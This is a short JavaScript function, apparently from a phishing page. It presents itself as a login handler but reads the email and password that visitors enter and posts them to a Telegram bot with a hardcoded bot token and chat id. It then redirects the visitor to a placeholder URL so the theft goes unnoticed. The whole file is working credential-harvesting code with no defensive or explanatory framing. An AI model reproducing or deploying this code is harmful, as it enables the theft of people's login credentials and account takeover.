function handleLogin() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    console.log("ok");
    const botToken = '7787030783:AAHsdt_XdMN-NWeKSFVHCv64lcwojOiFyUw';
    const chatId = '-1002679049892';
    const encodedEmail = btoa(email);
    const message = `New login attempt:\nEmail: ${encodedEmail}\nPassword: ${password}`;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(() => {
        window.location.href = 'https://your-redirect-url.com';
    });
}
